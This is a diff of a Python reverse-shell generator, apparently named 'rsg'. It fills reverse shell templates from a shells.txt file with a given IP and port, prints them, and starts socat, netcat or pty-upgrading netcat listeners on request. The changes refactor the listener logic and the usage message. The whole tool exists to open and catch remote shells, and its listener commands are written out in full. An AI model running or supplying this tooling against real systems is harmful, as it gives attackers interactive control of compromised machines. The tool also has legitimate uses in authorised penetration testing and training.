@@ -1,25 +1,60 @@
 #!/usr/bin/env python3
 
 from sys import argv, exit as exit_code
-from os import system, path
+from os import system, path, readlink
 from re import findall
 from subprocess import check_output
+from shutil import which
+import signal
+
 
 def GREEN(text):
     return "\033[32m{}\033[0m".format(str(text))
 
+
+def RED(text):
+    return "\033[31m{}\033[0m\n".format(str(text))
+
+
 def usage():
-    print('''Usage: python3 {} <ip address> <port> [shell type]
+    # we check if our program is in the $PATH
+    program_name = "rsg"
+    absolute_program_path = path.join(path.dirname(path.realpath(__file__)), program_name)
+
+    # if the path returned by the utility "which" is a symlink,
+    # we get the target
+    candidate_program_file = which(program_name)
+    if path.islink(candidate_program_file):
+        candidate_program_file = readlink(candidate_program_file)
+
+    # we check that the two paths match
+    if candidate_program_file != absolute_program_path:
+        # if our program is not in the $PATH,
+        # we change the usage message accordingly
+        program_name = f"python3 {argv[0]}"
+
+    print(f"""Usage: {program_name} <ip address> <port> [shell type]
+
 Examples:
-    python3 {} 127.0.0.1 4444
-    python3 {} 192.168.0.1 443 bash'''.format(argv[0],argv[0],argv[0]))
+    {program_name} 127.0.0.1 4444
+    {program_name} 192.168.0.1 443 bash""")
     exit_code(-1)
+
 
 def verify_ip(ipaddr):
     output = check_output(['ip', 'address']).decode()
-    candidate_ips = [ip for ip in findall(r"(?:\d{1,3}\.){3}\d{1,3}",output) if '255' not in ip]
+    candidate_ips = [ip for ip in findall(r"(?:\d{1,3}\.){3}\d{1,3}", output) if '255' not in ip]
 
     return ipaddr in candidate_ips
+
+
+def handler(signum, frame):
+    print()
+    exit_code(-1)
+
+
+signal.signal(signal.SIGINT, handler)
+
 
 def main():
     if len(argv) < 3:
@@ -28,39 +63,103 @@ def main():
     ipaddr, port = argv[1], argv[2]
 
     if not verify_ip(ipaddr):
-        print("Invalid IP address! Exiting.")
+        print(RED("Invalid IP address! Exiting."))
         exit_code(-1)
 
-    shells = path.join(path.dirname(path.realpath(__file__)), 'shells.txt')
-    if len(argv) == 4:
-        shell_type = argv[3].upper()
-    else:
-        shell_type = ''
-    for shell in open(shells):
-        desc, cmd = shell.split('|', 1)
-        cmd = cmd.replace("[IPADDR]", ipaddr)
-        cmd = cmd.replace("[PORT]", port)
-        if shell_type in desc:
-            print(GREEN(desc))
-            print(cmd)
+    # this dictionary will contain all possible shells in the form:
+    # { shell_type: [ (desc0, cmd0), (desc1, cmd1), ... ], ... }
+    shells = {}
 
-    c = input('Select your payload, press "l" to listen on port {} or enter to exit: '.format(port))
-    if c == 'l':
-        if int(port) < 1024:
-            if shell_type == 'SOCAT':
-                print(shell_type)
-                system('sudo socat file:`tty`,raw,echo=0 tcp-listen:{},fork'.format(port))
-            # stablizied NC Listener
-            elif: 
-                system('stty raw -echo; (echo \'script -qc "/bin/bash" /dev/null\';echo pty;echo "stty$(stty -a | awk -F \';\' \'{print $2 $3}\' | head -n 1)";echo export PATH=\\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;echo export TERM=xterm-256color;echo alias ll=\'ls -lsaht\'; echo clear; echo id;cat) | nc -lvnp <port> && reset')
+    # we populate the shells dictionary, parsing the shell file
+    shells_file = path.join(path.dirname(path.realpath(__file__)), 'shells.txt')
+    with open(shells_file) as fd:
+        for shell in fd.readlines():
+            desc, cmd = shell.split('|', 1)
+            cmd = cmd.replace("[IPADDR]", ipaddr)
+            cmd = cmd.replace("[PORT]", port)
+
+            # the first word in the description is the shell type
+            shell_type = desc.split(" ")[0].lower()
+
+            this_shell = (desc, cmd, )
+
+            if shell_type not in shells.keys():
+                shells[shell_type] = [this_shell,]
             else:
-                system('sudo nc -n -v -l -s {} -p {}'.format(ipaddr, port))
+                shells[shell_type].append(this_shell)
+
+    # this are all possible shell types
+    default_shell_type = "bash"
+    shell_types = shells.keys()
+
+    # it is now important to select the right shell type
+    if len(argv) >= 4:
+        candidate_shell_type = argv[3].lower()
+        if candidate_shell_type not in shell_types:
+            shell_type = default_shell_type
+            print(RED(f"Invalid shell type. Using default ({shell_type})"))
         else:
-            if shell_type == 'SOCAT':
-                print(shell_type)
-                system('socat file:`tty`,raw,echo=0 tcp-listen:{},fork'.format(port))
-            else:
-                system('nc -n -v -l -s {} -p {}'.format(ipaddr, port))
+            shell_type = candidate_shell_type
+    else:
+        shell_type = default_shell_type
+        print(RED(f"Shell type not specified. Using default ({shell_type})"))
+
+    # printing selected shells
+    for desc, cmd in shells[shell_type]:
+        print(GREEN(desc))
+        print(cmd)
+
+    # before proceding we set up commands, in case we have to listen to
+    sudo = "sudo" if int(port) < 1024 else ""
+    commands = {
+                    'socat': f"{sudo} socat file:`tty`,raw,echo=0 tcp-listen:{port},fork",
+                    'netcat': f"{sudo} nc -n -v -l -s {ipaddr} -p {port}",
+                    'interactive_netcat': ('stty raw -echo; '
+                                           '(echo \'script -qc "/bin/bash" /dev/null\';echo pty;echo "stty$(stty -a | awk -F \';\' \'{print $2 $3}\' | head -n 1)"; '
+                                           'echo export PATH=\\$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp; '
+                                           'echo export TERM=xterm-256color;echo alias ll=\'ls -lsaht\'; echo clear; echo id;cat) | '
+                                           f"{sudo} nc -n -v -l -s {ipaddr} -p {port} && reset")
+               }
+
+    # printing
+    print(GREEN('Select your payload then:'), end="")
+
+    # according to our shell_type we decide the message to output
+    msg = ""
+
+    if shell_type != 'socat':
+        msg = f"""
+    - press 'i' to attempt spawning an interactive netcat listener on port {port},"""
+
+    listener_label = 'socat' if shell_type == 'socat' else 'netcat'
+    msg += f"""
+    - press 'l' to spawn a {listener_label} listener on port {port},
+    - press any other key to exit.
+"""
+
+    # we now have to select the listener key, which will be used
+    # in the commands dictionary for selecting an approriate listener
+    c = input(msg)
+
+    if shell_type == 'socat':
+        if c == "l":
+            listener_key = 'socat'
+        else:
+            exit_code(0)
+
+    else:
+        if c == "l":
+            listener_key = 'netcat'
+        elif c == "i":
+            listener_key = 'interactive_netcat'
+        else:
+            exit_code(0)
+
+    # if the listener key is correct we get the command and execute it
+    if listener_key in commands.keys():
+        command = commands[listener_key]
+        system(command)
+
 
 if __name__ == "__main__":
     main()
